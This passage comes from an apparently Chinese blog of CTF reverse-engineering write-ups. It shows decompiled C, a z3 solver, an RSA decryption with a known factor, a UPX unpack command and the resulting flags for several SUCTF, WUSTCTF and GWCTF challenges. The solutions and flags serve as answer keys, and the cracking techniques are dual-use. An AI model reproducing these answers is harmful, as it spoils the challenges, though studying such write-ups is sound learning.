class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>变成数学问题了，变成数学问题就简单的多了。</p><p>看起来应该是<code>a1</code>这个字符数组里面的内容就是我们要找的flag了，并且长度也是32位，符合一般的flag的32位的md5的特征，所以直接解一下方程即可，编写<code>z3-solver</code>脚本如下(注意要先下载<code>z3-solver</code>库)。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> z3 <span class="token keyword">import</span> <span class="token operator">*</span>s <span class="token operator">=</span> Solver<span class="token punctuation">(</span><span class="token punctuation">)</span>a1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a1<span class="token punctuation">.</span>append<span class="token punctuation">(</span>Int<span class="token punctuation">(</span><span class="token string">'a1['</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">']'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># z3声名整数型的符号变量</span><span class="token comment"># add为添加至z3约束求解器中的内容</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">1629056</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">166163712</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">6771600</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">731332800</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">3682944</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">357245568</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">10431000</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1074393000</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">3977328</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">489211344</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">5138336</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">518971936</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">7532250</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">406741500</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">5551632</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">294236496</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">3409728</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">177305856</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">13013670</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">650683500</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">6088797</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">298351053</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">7884663</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">386348487</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">8944053</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">438258597</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">5198490</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">249527520</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">4544518</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">445362764</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">10115280</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">981182160</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">3645600</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">174988800</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">9667504</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">493042704</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">5364450</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">257493600</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">13464540</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">767478780</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">5488432</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">312840624</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">14479500</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1404511500</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">6451830</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">316139670</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">6252576</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">619005024</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">7763364</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">372641472</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">7327320</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">373693320</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">8741520</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">498266640</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">8871876</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">452465676</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">4086720</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">208422720</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> <span class="token number">9374400</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">515592000</span> <span class="token punctuation">)</span>s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">5759124</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">719890500</span><span class="token punctuation">)</span><span class="token comment"># z3约束求解</span>s<span class="token punctuation">.</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span>res <span class="token operator">=</span> s<span class="token punctuation">.</span>model<span class="token punctuation">(</span><span class="token punctuation">)</span>res <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>a <span class="token operator">=</span> res<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">31</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    temp <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span>    temp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>temp<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># flag&#123;e65421110ba03099a1c039337&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>开始没发现a1[6]并没有给，看wp知道a1[6]的值为<code>1</code>，故flag为</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;e165421110ba03099a1c039337&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="SUCTF2019-SignIn"><a href="#SUCTF2019-SignIn" class="headerlink" title="[SUCTF2019]SignIn"></a>[SUCTF2019]SignIn</h3><p><strong>TAG:RSA、ELF文件</strong></p><p>没壳，打开一看不就是RSA吗，看到65537就感觉不简单，简单解下RSA即可</p><p><img src="/2021/05/28/CTF/image-20210607165616788.png" alt></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytesn <span class="token operator">=</span> <span class="token number">103461035900816914121390101299049044413950405173712170434161686539878160984549</span>c <span class="token operator">=</span> <span class="token number">0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35</span>e <span class="token operator">=</span> <span class="token number">65537</span>p <span class="token operator">=</span> <span class="token number">282164587459512124844245113950593348271</span>q <span class="token operator">=</span> n <span class="token operator">//</span> pphi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>flag <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># b'suctf&#123;Pwn_@_hundred_years&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="WUSTCTF2020-level1"><a href="#WUSTCTF2020-level1" class="headerlink" title="[WUSTCTF2020]level1"></a>[WUSTCTF2020]level1</h3><p><strong>TAG:一般题目</strong></p><p>给出了两个附件，一个是txt文件，另一个是一般的ELF的64位文件，txt文件给出的应该是程序的输出，将程序拖入64位ida分析，找到关键代码如下:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-2Ch]</span>  FILE <span class="token operator">*</span>stream<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-28h]</span>  <span class="token keyword">char</span> ptr<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-20h] BYREF</span>  <span class="token keyword">unsigned</span> __int64 v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-8h]</span>  v7 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  stream <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fread</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">,</span> <span class="token number">0x14uLL</span><span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fclose</span><span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">19</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>i <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token punctuation">)</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%ld\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%ld\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">*</span> ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一般的差不多算是加密的东西，直接得(太签到了)</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">out <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">198</span><span class="token punctuation">,</span> <span class="token number">232</span><span class="token punctuation">,</span> <span class="token number">816</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">1536</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">6144</span><span class="token punctuation">,</span> <span class="token number">984</span><span class="token punctuation">,</span> <span class="token number">51200</span><span class="token punctuation">,</span> <span class="token number">570</span><span class="token punctuation">,</span> <span class="token number">92160</span><span class="token punctuation">,</span> <span class="token number">1200</span><span class="token punctuation">,</span> <span class="token number">565248</span><span class="token punctuation">,</span> <span class="token number">756</span><span class="token punctuation">,</span> <span class="token number">1474560</span><span class="token punctuation">,</span> <span class="token number">800</span><span class="token punctuation">,</span> <span class="token number">6291456</span><span class="token punctuation">,</span> <span class="token number">1782</span><span class="token punctuation">,</span> <span class="token number">65536000</span><span class="token punctuation">]</span><span class="token comment"># 上面首位加上0作为填充位</span>res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> i<span class="token operator">&amp;</span><span class="token number">1</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        temp <span class="token operator">=</span> out<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>></span> i        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        temp <span class="token operator">=</span> out<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">//</span> i        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># ctf2020&#123;d9-dE6-20c&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="WUSTCTF2020-level2"><a href="#WUSTCTF2020-level2" class="headerlink" title="[WUSTCTF2020]level2"></a>[WUSTCTF2020]level2</h3><p><strong>TAG:UPX脱壳</strong></p><p>打开没有后缀名，misc做习惯了之后总是先把这种比较小得没有后缀名的文件先使用记事本打开看看有什么东西。注意到UPX，直接脱壳</p><pre class="line-numbers language-none"><code class="language-none">.\upx.exe -d .\attachment\attachment<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/28/CTF/image-20210610004111012.png" alt></p><p><img src="/2021/05/28/CTF/image-20210610005411954.png" alt></p><p>但是这个似乎不是64位的可执行文件，而是i386。。应该是32位，ida32打开之后看函数太多先查找字符串</p><p><img src="/2021/05/28/CTF/image-20210610010158519.png" alt></p><p>我踏马直接大雾，这是什么牛马，这为啥就直接就在这，这是签到吗，为啥还叫level2啊。。。想了许久，也许比赛本来是面向新生的，新生可能对upx的脱壳方法不太了解罢。</p><pre class="line-numbers language-none"><code class="language-none">wctf2020&#123;Just_upx_-d&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="GWCTF-2019-xxor"><a href="#GWCTF-2019-xxor" class="headerlink" title="[GWCTF 2019]xxor"></a>[GWCTF 2019]xxor</h3><p><strong>TAG:</strong></p><p><img src="/2021/05/28/CTF/image-20210610010527059.png" alt></p><p>关键<code>mian</code>函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-68h]</span>  <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-64h]</span>  __int64 v6<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-60h] BYREF</span>  __int64 v7<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+40h] [rbp-30h] BYREF</span>  v7<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Let us play a game?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"you have six chances to input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Come on!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v6<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v6<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v6<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v6<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v6<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">5</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token string">"input: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    a2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v6 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  v7<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v7<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v7<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v7<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v7<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    dword_601078 <span class="token operator">=</span> v6<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    dword_60107C <span class="token operator">=</span> <span class="token function">HIDWORD</span><span class="token punctuation">(</span>v6<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    a2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_601060<span class="token punctuation">;</span>    <span class="token function">sub_400686</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dword_601078<span class="token punctuation">,</span> <span class="token operator">&amp;</span>unk_601060<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">LODWORD</span><span class="token punctuation">(</span>v7<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">=</span> dword_601078<span class="token punctuation">;</span>    <span class="token function">HIDWORD</span><span class="token punctuation">(</span>v7<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">=</span> dword_60107C<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_400770</span><span class="token punctuation">(</span>v7<span class="token punctuation">,</span> a2<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"NO NO NO~ "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Congratulation!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You seccess half\n"</span><span class="token 